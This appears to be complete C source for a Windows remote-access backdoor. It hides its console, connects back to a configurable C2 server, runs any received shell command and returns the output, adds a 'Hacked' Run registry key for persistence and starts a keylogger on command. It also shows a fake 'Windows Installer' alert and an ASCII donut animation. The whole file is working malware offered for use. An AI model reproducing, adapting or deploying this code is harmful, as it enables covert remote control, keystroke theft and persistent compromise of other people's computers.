#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <math.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;
int donut_running = 0;

// Donut animation function
DWORD WINAPI displayDonut(LPVOID lpParam) {
    float A = 0, B = 0;
    float i, j;
    int k;
    float z[1760];
    char b[1760];
    
    // Create a console for the donut if needed
    AllocConsole();
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    
    // Hide cursor
    CONSOLE_CURSOR_INFO cursorInfo;
    GetConsoleCursorInfo(hConsole, &cursorInfo);
    cursorInfo.bVisible = FALSE;
    SetConsoleCursorInfo(hConsole, &cursorInfo);
    
    printf("\x1b[2J"); // Clear screen
    
    while(donut_running) {
        memset(b, 32, 1760);
        memset(z, 0, sizeof(z));
        
        for(j = 0; j < 6.28; j += 0.07) {
            for(i = 0; i < 6.28; i += 0.02) {
                float c = sin(i);
                float d = cos(j);
                float e = sin(A);
                float f = sin(j);
                float g = cos(A);
                float h = d + 2;
                float D = 1 / (c * h * e + f * g + 5);
                float l = cos(i);
                float m = cos(B);
                float n = sin(B);
                float t = c * h * g - f * e;
                
                int x = 40 + 30 * D * (l * h * m - t * n);
                int y = 12 + 15 * D * (l * h * n + t * m);
                int o = x + 80 * y;
                int N = 8 * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);
                
                if(22 > y && y > 0 && x > 0 && 80 > x && D > z[o]) {
                    z[o] = D;
                    b[o] = ".,-~:;=!*#$@"[N > 0 ? N : 0];
                }
            }
        }
        
        // Clear screen and display
        COORD cursorPosition = {0, 0};
        SetConsoleCursorPosition(hConsole, cursorPosition);
        
        for(k = 0; k < 1761; k++) {
            if(k % 80) {
                putchar(b[k]);
            } else {
                putchar('\n');
            }
        }
        
        A += 0.04;
        B += 0.02;
        Sleep(30);
    }
    
    FreeConsole();
    return 0;
}

int bootRun()
{
    char err[128] = "Failed\n";
    char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    HKEY NewVal;

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

char *
str_cut(char str[], int slice_from, int slice_to)
{
    if (str[0] == '\0')
        return NULL;

    char *buffer;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
            return NULL;

        if (abs(slice_from) > str_len)
            slice_from = (-1) * str_len;

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
            return NULL;
        buffer_len = slice_to - slice_from;
        str += slice_from;

    } else
        return NULL;

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}

void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];
    HANDLE donut_thread = NULL;

    while (1) {
        jump:
        bzero(buffer,1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        
        int bytes_received = recv(sock, buffer, 1024, 0);
        if (bytes_received <= 0) {
            // Connection lost, try to reconnect
            closesocket(sock);
            return;
        }

        if (strncmp("q", buffer, 1) == 0) {
            if (donut_running) {
                donut_running = 0;
                Sleep(100);
            }
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if (strncmp("cd ", buffer, 3) == 0) {
            char *path = str_cut(buffer, 3, 100);
            if (path) {
                chdir(path);
                free(path);
            }
        }
        else if (strncmp("persist", buffer, 7) == 0) {
            bootRun();
        }
        else if (strncmp("keylog_start", buffer, 12) == 0) {
            HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
            if (thread) CloseHandle(thread);
            goto jump;
        }
        else if (strncmp("donut_start", buffer, 11) == 0) {
            if (!donut_running) {
                donut_running = 1;
                donut_thread = CreateThread(NULL, 0, displayDonut, NULL, 0, NULL);
                send(sock, "Donut animation started\n", 24, 0);
            } else {
                send(sock, "Donut already running\n", 22, 0);
            }
            goto jump;
        }
        else if (strncmp("donut_stop", buffer, 10) == 0) {
            if (donut_running) {
                donut_running = 0;
                if (donut_thread) {
                    WaitForSingleObject(donut_thread, 1000);
                    CloseHandle(donut_thread);
                    donut_thread = NULL;
                }
                send(sock, "Donut animation stopped\n", 24, 0);
            } else {
                send(sock, "Donut not running\n", 18, 0);
            }
            goto jump;
        }
        else {
            FILE *fp;
            fp = _popen(buffer, "r");
            if (fp) {
                while(fgets(container, 1024, fp) != NULL) {
                    strcat(total_response, container);
                }
                send(sock, total_response, sizeof(total_response), 0);
                fclose(fp);
            } else {
                send(sock, "Command execution failed\n", 25, 0);
            }
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0); // Hide console window

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char *ServIP;
    WSADATA wsaData;

    ServIP = "192.168.0.5"; // Change this to your C2 server IP
    ServPort = 9001; // Change this to your desired port

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            Sleep(5000);
            continue;
        }

        memset(&ServAddr, 0, sizeof(ServAddr));
        ServAddr.sin_family = AF_INET;
        ServAddr.sin_addr.s_addr = inet_addr(ServIP);
        ServAddr.sin_port = htons(ServPort);

        if (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) == 0) {
            MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
            Shell();
        }

        closesocket(sock);
        Sleep(10000); 
    }

    WSACleanup();
    return 0;
}
